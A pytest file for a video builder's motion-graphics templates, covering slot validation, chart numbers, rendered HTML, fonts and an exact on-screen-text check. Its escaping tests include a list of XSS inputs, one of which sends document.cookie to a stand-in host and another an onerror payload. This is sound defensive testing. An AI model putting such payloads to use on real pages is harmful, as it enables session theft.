"""The five templates of Motion graphics (ADR-0079, MG1): their fields, the page each makes, the
moments and words the exact-text check looks for, and how its report is read."""

import re
from html.parser import HTMLParser
from typing import Any

import pytest
from wasifyai_video.builder import check, templates

SAMPLES: dict[str, dict[str, Any]] = {
    "title": {"title": "Launch day", "subtitle": "Wasify AI is here"},
    "quote": {"quote": "The best way to predict the future is to invent it.", "author": "Alan Kay"},
    "chart": {
        "title": "Sales by region",
        "data": "North, 120\nSouth, $95\nEast, 45%\nWest, 1,200.5",
    },
    "lower_third": {"name": "Maya Chen", "role": "Head of Design"},
    "captions": {"lines": "Hello there\nThis is a caption\nAnd another one"},
}


def slots_of(template: str, **over: Any) -> dict[str, Any]:
    return templates.normalize_slots(template, {**SAMPLES[template], **over})


def test_there_are_six_templates_each_with_samples_and_a_description_for_the_window():
    assert tuple(templates.TEMPLATES) == (
        "title", "quote", "chart", "lower_third", "end_card", "captions",
    )  # fmt: skip
    for t in templates.TEMPLATES.values():
        info = t.info()
        assert info["description"] and info["fields"] and info["formats"][0] in templates.FORMATS
        assert {f["kind"] for f in info["fields"]} <= {
            "text", "longtext", "lines", "rows", "choice", "seconds",
        }  # fmt: skip
    assert (
        templates.TEMPLATES["lower_third"].transparent
        and templates.TEMPLATES["captions"].transparent
    )
    assert templates.TEMPLATES["title"].formats == ("mp4",)
    assert templates.TEMPLATES["lower_third"].formats == ("webm", "mov", "mp4")


@pytest.mark.parametrize("template", list(SAMPLES))
def test_every_template_checks_completes_and_repeats_its_slots(template):
    slots = slots_of(template)
    assert {"shape", "theme", "font", "seconds"} <= set(slots)
    assert templates.normalize_slots(template, slots) == slots  # checked slots are accepted again
    assert templates.render_html(template, slots) == templates.render_html(template, dict(slots))
    assert templates.title_of(template, slots) and len(templates.title_of(template, slots)) <= 60
    times = templates.preview_times(template, slots)
    assert len(times) == 3 and times == sorted(times) and times[-1] <= slots["seconds"]
    assert templates.describe(template, slots)


def test_slots_are_refused_in_words_and_nothing_unknown_is_dropped():
    cases = (
        ("title", {"title": ""}, "Write a title"),
        ("title", {"title": "x" * 81}, "too long"),
        ("title", {"title": "ok", "shape": "wide"}, "must be one of"),
        ("title", {"title": "ok", "theme": "neon"}, "must be one of"),
        ("title", {"title": "ok", "font": "comic"}, "must be one of"),
        ("title", {"title": "ok", "seconds": 2}, "between 3 and 90"),
        ("title", {"title": "ok", "seconds": "soon"}, "number of seconds"),
        ("title", {"title": "ok", "colour": "red"}, "no setting called colour"),
        ("title", {"title": "ok\x00"}, "cannot be shown"),
        ("quote", {"quote": ""}, "Write a quote"),
        ("quote", {"quote": "x" * 221}, "too long"),
        ("chart", {"title": "T", "data": "a, 1"}, "at least two lines"),
        ("chart", {"title": "T", "data": "a, 1\nb"}, "needs a label, a comma and a number"),
        ("chart", {"title": "T", "data": "a, 1\nb, many"}, "not a number"),
        ("chart", {"title": "T", "data": "a, 1\nb, -4"}, "not a number"),
        ("chart", {"title": "T", "data": "a, 0\nb, 0"}, "above zero"),
        ("chart", {"title": "T", "data": "\n".join(f"a{i}, {i}" for i in range(9))}, "at most 8"),
        ("lower_third", {"name": ""}, "Write a name"),
        ("captions", {"lines": ""}, "at least 1 line"),
        ("captions", {"lines": "\n".join(["x"] * 46)}, "at most 45 lines"),
        ("captions", {"lines": "\n".join(["x"] * 31), "per_line": "3"}, "the longest is 90"),
        ("captions", {"lines": "x" * 91}, "too long"),
        ("captions", {"lines": "x", "per_line": "9"}, "must be one of"),
    )
    for template, raw, words in cases:
        with pytest.raises(templates.SlotError, match=words):
            templates.normalize_slots(template, raw)
    with pytest.raises(templates.SlotError, match="does not exist"):
        templates.normalize_slots("poster", {"title": "x"})


def test_numbers_are_understood_as_typed_and_shown_as_typed():
    assert templates.parse_number("$1,200") == 1200
    assert templates.parse_number("45%") == 45
    assert templates.parse_number("3.5 m") == 3.5
    assert templates.parse_number("€ 7") == 7
    assert templates.parse_number(".5") == 0.5
    assert templates.parse_number("many") is None and templates.parse_number("") is None
    slots = slots_of("chart")
    assert [r["value"] for r in slots["data"]] == ["120", "$95", "45%", "1,200.5"]
    page = templates.render_html("chart", slots)
    for typed in ("$95", "45%", "1,200.5"):
        assert f">{typed}</span>" in page  # the number is shown as it was typed, not reformatted


def test_the_captions_length_follows_their_number_and_the_chosen_pace():
    s = slots_of("captions", per_line="4")
    assert s["seconds"] == 12 and s["lines"] == [
        "Hello there",
        "This is a caption",
        "And another one",
    ]
    assert slots_of("captions", lines="One", per_line="2")["seconds"] == 2
    assert [e.at for e in templates.expected("captions", s)] == [
        2.0,
        6.0,
        10.0,
    ]  # the middle of each


class Parts(HTMLParser):
    """What a browser would make of a page: its elements, attributes and the text of each slot."""

    def __init__(self) -> None:
        super().__init__()
        self.tags: list[str] = []
        self.attrs: list[tuple[str, str | None]] = []
        self.slots: dict[str, str] = {}
        self._slot: str | None = None

    def handle_starttag(self, tag, attrs):
        self.tags.append(tag)
        self.attrs += attrs
        self._slot = dict(attrs).get("data-slot") or self._slot

    def handle_endtag(self, tag):
        self._slot = None

    def handle_data(self, data):
        if self._slot:
            self.slots[self._slot] = self.slots.get(self._slot, "") + data


HOSTILE = [
    '</h1><script>fetch("http://evil.test/?c="+document.cookie)</script>',
    '"><img src=x onerror=alert(1)>',
    "Tom & Jerry <Studio> \"Q4\" 'quoted'",
    "{{ title }} ${title} `x`",
    "</style><style>body{display:none}</style>",
]
TEXT_FIELD = {"title": "title", "quote": "quote", "chart": "title", "lower_third": "name"}


@pytest.mark.parametrize("words", HOSTILE)
@pytest.mark.parametrize("template", list(TEXT_FIELD))
def test_the_words_go_into_every_page_as_text_never_as_markup(template, words):
    slots = templates.normalize_slots(
        template, {**SAMPLES[template], TEXT_FIELD[template]: words[:60]}
    )
    page = templates.render_html(template, slots)
    parts = Parts()
    parts.feed(page)
    assert parts.tags.count("script") == 2 and parts.tags.count("style") == 1  # ours, and only ours
    assert "img" not in parts.tags and "iframe" not in parts.tags
    assert not any(k.startswith("on") for k, _ in parts.attrs)
    first = templates.expected(template, slots)[0]
    assert parts.slots[first.slot] == slots[TEXT_FIELD[template]] == first.text


def test_the_captions_and_rows_are_text_too():
    s = slots_of("captions", lines='<script>x</script>\n"quoted" & more')
    page = templates.render_html("captions", s)
    parts = Parts()
    parts.feed(page)
    assert parts.slots["caption-0"] == "<script>x</script>" and parts.tags.count("script") == 2
    c = slots_of("chart", data="<b>a</b>, 1\nb&c, 2")
    parts = Parts()
    parts.feed(templates.render_html("chart", c))
    assert parts.slots["label-0"] == "<b>a</b>" and parts.slots["label-1"] == "b&c"


@pytest.mark.parametrize("template", list(SAMPLES))
def test_every_page_loads_nothing_from_outside_reads_no_clock_and_ships_its_font(template):
    slots = slots_of(template)
    page = templates.render_html(template, slots)
    assert not re.search(r"https?://|//[a-z]", page.replace("<!doctype html>", ""))
    for forbidden in ("Date.now", "Math.random", "setTimeout", "setInterval", "fetch(", "eval("):
        assert forbidden not in page
    assert 'src="vendor/gsap.min.js"' in page and 'window.__timelines["main"]' in page
    assert 'data-composition-id="main"' in page and f'data-duration="{slots["seconds"]}"' in page
    family, file, _ = templates.FONTS[slots["font"]]
    assert f'font-family: "{family}"' in page and f'url("vendor/fonts/{file}")' in page
    other = [f for f in templates.FONTS.values() if f[1] != file][0]
    assert other[1] not in page  # only the font that is used is asked for


def test_overlays_are_transparent_and_the_rest_have_a_background():
    for template in SAMPLES:
        page = templates.render_html(template, slots_of(template))
        t = templates.TEMPLATES[template]
        assert ("background: transparent" in page.split("#root")[1].split("}")[0]) == t.transparent
        assert ("linear-gradient" in page) == (not t.transparent)


def test_each_shape_has_its_size_and_the_look_and_letters_are_presets():
    sizes = {
        "landscape": (1920, 1080), "portrait": (1080, 1920), "square": (1080, 1080),
        "feed": (1080, 1350),
    }  # fmt: skip
    for shape, (w, h) in sizes.items():
        page = templates.render_html("title", slots_of("title", shape=shape))
        assert f'data-width="{w}"' in page and f'data-height="{h}"' in page
    serif = templates.render_html("quote", slots_of("quote"))
    assert "Source Serif 4" in serif  # the quote is set in serif unless asked otherwise
    assert "Inter" in templates.render_html("quote", slots_of("quote", font="sans"))
    assert set(templates.FONT_FILES) == {f[1] for f in templates.FONTS.values()}


def test_the_font_packages_are_the_ones_the_component_pins():
    import json
    from pathlib import Path

    lock = json.loads(
        (
            Path(__file__).parents[3]
            / "services/api/src/wasifyai_api/video_builder/package-lock.json"
        ).read_text()
    )
    for rel in templates.FONT_FILES.values():
        package = "node_modules/" + "/".join(rel.split("/")[:2])
        assert lock["packages"][package]["license"] == "OFL-1.1"


# ---- what the check looks for, and how its report is read ------------------------------


@pytest.mark.parametrize("template", list(SAMPLES))
def test_the_check_looks_for_every_word_at_a_moment_it_is_on_the_screen(template):
    slots = slots_of(template)
    wanted = templates.expected(template, slots)
    assert wanted and all(0 < e.at <= slots["seconds"] for e in wanted)
    spec = check.spec_for(template, slots)
    assert [i["slot"] for i in spec["items"]] == [e.slot for e in wanted]
    assert spec["transparent"] == templates.TEMPLATES[template].transparent
    page = templates.render_html(template, slots)
    for e in wanted:  # every expected slot is an element of the page
        assert f'data-slot="{e.slot}"' in page, e.slot


def seen(template: str, slots: dict[str, Any], **over: dict[str, Any]) -> list[dict[str, Any]]:
    """A good report for these slots, with changes to single slots."""
    out = []
    for e in templates.expected(template, slots):
        item = {
            "slot": e.slot, "at": e.at, "found": True, "text": e.text, "shown": True,
            "opacity": 1, "inked": 400, "clipped": 0, "inside": True,
        }  # fmt: skip
        out.append({**item, **over.get(e.slot, {})})
    return out


@pytest.mark.parametrize("template", list(SAMPLES))
def test_a_report_that_matches_the_words_passes(template):
    slots = slots_of(template)
    assert check.compare(template, slots, seen(template, slots)) == []


def test_text_is_compared_exactly_except_for_how_it_is_spaced_and_composed():
    slots = slots_of("lower_third")
    assert (
        check.compare(
            "lower_third", slots, seen("lower_third", slots, name={"text": "Maya  Chen\n"})
        )
        == []
    )
    composed = "Café"  # e plus a combining accent, the same word as "Café"
    cafe = slots_of("lower_third", name="Café")
    assert (
        check.compare("lower_third", cafe, seen("lower_third", cafe, name={"text": composed})) == []
    )
    (p,) = check.compare(
        "lower_third", slots, seen("lower_third", slots, name={"text": "Maya Chan"})
    )
    assert (
        p["code"] == "text_mismatch" and "Maya Chan" in p["message"] and "Maya Chen" in p["message"]
    )
    (p,) = check.compare(
        "lower_third", slots, seen("lower_third", slots, name={"text": "MAYA CHEN"})
    )
    assert p["code"] == "text_mismatch"  # no letter case is changed for the person


@pytest.mark.parametrize(
    ("change", "code", "words"),
    [
        ({"found": False}, "missing", "is not on the screen"),
        ({"shown": False}, "hidden", "not fully visible"),
        ({"opacity": 0.4}, "hidden", "not fully visible"),
        ({"inked": 3}, "not_drawn", "nothing is drawn"),
        ({"clipped": 120}, "clipped", "cut off"),
        ({"inside": False}, "outside_safe_area", "too close to the edge"),
    ],
)
def test_each_way_the_screen_can_fail_is_named_in_words(change, code, words):
    slots = slots_of("lower_third")
    (p,) = check.compare("lower_third", slots, seen("lower_third", slots, name=change))
    assert p["code"] == code and words in p["message"] and "Maya Chen" in p["message"]
    assert p["slot"] == "name"


def test_a_missing_report_for_a_word_counts_as_missing_and_the_summary_is_plain():
    slots = slots_of("chart")
    report = [i for i in seen("chart", slots) if i["slot"] != "value-2"]
    problems = check.compare("chart", slots, report)
    assert [(p["slot"], p["code"]) for p in problems] == [("value-2", "missing")]
    text = check.describe(problems)
    assert (
        text.startswith("The words on the screen are not exactly what you wrote:") and "45%" in text
    )
    many = check.compare("chart", slots, [])
    assert len(many) == 9 and check.describe(many).endswith("(and 6 more)")


async def test_a_check_that_cannot_run_is_a_failure_and_not_a_pass():
    class Broken:
        async def inspect(self, folder, spec):
            return {"ok": False, "message": "The browser did not start.", "items": []}

    slots = slots_of("title")
    report = await check.run_check(Broken(), None, "title", slots)
    assert report["ok"] is False and "could not be run" in report["message"]

    class Good:
        async def inspect(self, folder, spec):
            return {"ok": True, "message": "", "items": seen("title", slots)}

    good = await check.run_check(Good(), None, "title", slots)
    assert (
        good["ok"] is True and good["checked"] == 2 and "exactly what you wrote" in good["message"]
    )


def test_a_big_word_is_not_called_cut_off_for_how_its_edges_are_redrawn():
    slots = templates.normalize_slots("title", {"title": "Try Fizzleaf", "font": "serif"})
    seen = {
        "slot": "title", "at": templates.expected("title", slots)[0].at, "found": True,
        "text": "Try Fizzleaf", "shown": True, "opacity": 1, "inside": True,
    }  # fmt: skip
    assert check.compare("title", slots, [{**seen, "inked": 13877, "clipped": 85}]) == []
    cut = check.compare("title", slots, [{**seen, "inked": 13877, "clipped": 400}])
    assert cut[0]["code"] == "clipped", "the tail of a letter is still caught"
    small = check.compare("title", slots, [{**seen, "inked": 900, "clipped": 90}])
    assert small[0]["code"] == "clipped", "and small words keep the plain limit"
